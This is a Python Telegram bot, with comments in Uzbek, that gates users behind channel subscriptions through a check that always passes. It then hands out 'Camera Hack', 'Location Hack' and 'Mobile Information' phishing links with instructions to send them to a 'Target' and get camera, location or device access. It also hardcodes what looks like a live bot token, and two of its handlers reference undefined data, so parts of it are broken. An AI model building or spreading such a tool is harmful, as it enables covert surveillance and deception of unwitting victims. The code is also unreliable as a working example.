from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import logging

# Logging sozlamasi
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 🔑 BU YERGA O'Z TOKENINGIZNI QO'YING (BotFather'dan olingan)
TOKEN = '8245886522:AAGGhzKyw9rjWrUzmJR11vsORqJs7UdgwQE'

# 4 ta kanal (2x2 tartibda)
CHANNELS = [
    ("📢 Kanal 1", "@Channel1"),
    ("📢 Kanal 2", "@Channel2"),
    ("📢 Kanal 3", "@Channel3"),
    ("📢 Kanal 4", "@Channel4"),
]

# Har bir bo'lim uchun ma'lumotlar — TO'G'RI SSILKALAR BILAN
SECTIONS = {
    "camera_hack": {
        "name": "Camera Hack",
        "link": "https://yourdomain.com/camera",  # Sizning saytingiz
        "method": "Share This Link to Your Target >> Open in Browser >> Allow Camera >> Done"
    },
    "phone_details": {
        "name": "Mobile Information",
        "link": "https://yourdomain.com/phone",   # Sizning saytingiz
        "method": "Share This Link to Your Target >> Open in Browser >> Allow Access >> Done"
    },
    "location_hack": {
        "name": "Location Hack",
        "link": "https://yourdomain.com/location", # Sizning saytingiz
        "method": "Share This Link to Your Target >> Open in Browser >> Allow Location >> Done"
    }
}

# Mock: Hozircha hamma obuna bo'lgan deb hisoblaymiz
async def check_subscription(user_id):
    return True

# /start komandasi — obuna so'rash
async def start(update, context):
    keyboard = [
        [
            InlineKeyboardButton(CHANNELS[0][0], url=f"https://t.me/{CHANNELS[0][1].lstrip('@')}"),
            InlineKeyboardButton(CHANNELS[1][0], url=f"https://t.me/{CHANNELS[1][1].lstrip('@')}")
        ],
        [
            InlineKeyboardButton(CHANNELS[2][0], url=f"https://t.me/{CHANNELS[2][1].lstrip('@')}"),
            InlineKeyboardButton(CHANNELS[3][0], url=f"https://t.me/{CHANNELS[3][1].lstrip('@')}")
        ],
        [InlineKeyboardButton("✅ Tekshirish", callback_data='check_subscription')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "👋 Assalomu alaykum!\n\n"
        "Iltimos, quyidagi 4 ta kanalga obuna bo'ling 👇",
        reply_markup=reply_markup
    )

# "✅ Tekshirish" tugmasi bosilganda
async def check_subscription_callback(update, context):
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    is_subscribed = await check_subscription(user_id)

    if is_subscribed:
        await show_main_menu(update, context, edit=True)
    else:
        keyboard = [
            [
                InlineKeyboardButton(CHANNELS[0][0], url=f"https://t.me/{CHANNELS[0][1].lstrip('@')}"),
                InlineKeyboardButton(CHANNELS[1][0], url=f"https://t.me/{CHANNELS[1][1].lstrip('@')}")
            ],
            [
                InlineKeyboardButton(CHANNELS[2][0], url=f"https://t.me/{CHANNELS[2][1].lstrip('@')}"),
                InlineKeyboardButton(CHANNELS[3][0], url=f"https://t.me/{CHANNELS[3][1].lstrip('@')}")
            ],
            [InlineKeyboardButton("✅ Tekshirish", callback_data='check_subscription')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text="❌ Hali ham barcha kanallarga obuna bo'lmagansiz.\n\nIltimos, obuna bo'ling va qayta tekshiring 👇",
            reply_markup=reply_markup
        )

# Asosiy menyuni ko'rsatish (2x2 + 1 tartibda)
async def show_main_menu(update, context, edit=False):
    keyboard = [
        [
            InlineKeyboardButton("All in One Hack", callback_data='all_in_one_hack'),
            InlineKeyboardButton("Location Hack", callback_data='location_hack')
        ],
        [
            InlineKeyboardButton("Camera Hack", callback_data='camera_hack'),
            InlineKeyboardButton("Mobile Information", callback_data='phone_details')
        ],
        [InlineKeyboardButton("Account Hack Section", callback_data='account_hack')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "🎉 Obuna bo'ldingiz! Quyidagi bo'limlardan birini tanlang:"

    if edit:
        await update.callback_query.edit_message_text(text=text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text=text, reply_markup=reply_markup)

# Har bir bo'limni bosganda — siz xohlagan formatdagi xabar yuboriladi
async def all_in_one_hack(update, context):
    query = update.callback_query
    await query.answer()

    data = SECTIONS["all_in_one_hack"]
    message_text = (
        f"Page Name : {data['name']}\n\n"
        f"Link : {data['link']}\n\n"
        f"Method to Use : {data['method']}"
    )

    await query.edit_message_text(text=message_text)

async def location_hack(update, context):
    query = update.callback_query
    await query.answer()

    data = SECTIONS["location_hack"]
    message_text = (
        f"Page Name : {data['name']}\n\n"
        f"Link : {data['link']}\n\n"
        f"Method to Use : {data['method']}"
    )

    await query.edit_message_text(text=message_text)

async def camera_hack(update, context):
    query = update.callback_query
    await query.answer()

    data = SECTIONS["camera_hack"]
    message_text = (
        f"Page Name : {data['name']}\n\n"
        f"Link : {data['link']}\n\n"
        f"Method to Use : {data['method']}"
    )

    await query.edit_message_text(text=message_text)

async def phone_details(update, context):
    query = update.callback_query
    await query.answer()

    data = SECTIONS["phone_details"]
    message_text = (
        f"Page Name : {data['name']}\n\n"
        f"Link : {data['link']}\n\n"
        f"Method to Use : {data['method']}"
    )

    await query.edit_message_text(text=message_text)

async def account_hack(update, context):
    query = update.callback_query
    await query.answer()

    data = SECTIONS["account_hack"]
    message_text = (
        f"Page Name : {data['name']}\n\n"
        f"Link : {data['link']}\n\n"
        f"Method to Use : {data['method']}"
    )

    await query.edit_message_text(text=message_text)

# Botni ishga tushirish
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(check_subscription_callback, pattern='check_subscription'))
    application.add_handler(CallbackQueryHandler(all_in_one_hack, pattern='all_in_one_hack'))
    application.add_handler(CallbackQueryHandler(location_hack, pattern='location_hack'))
    application.add_handler(CallbackQueryHandler(camera_hack, pattern='camera_hack'))
    application.add_handler(CallbackQueryHandler(phone_details, pattern='phone_details'))
    application.add_handler(CallbackQueryHandler(account_hack, pattern='account_hack'))

    logger.info("✅ Bot ishga tushdi! Telegramda /start yozing.")
    application.run_polling()

if __name__ == '__main__':
    main()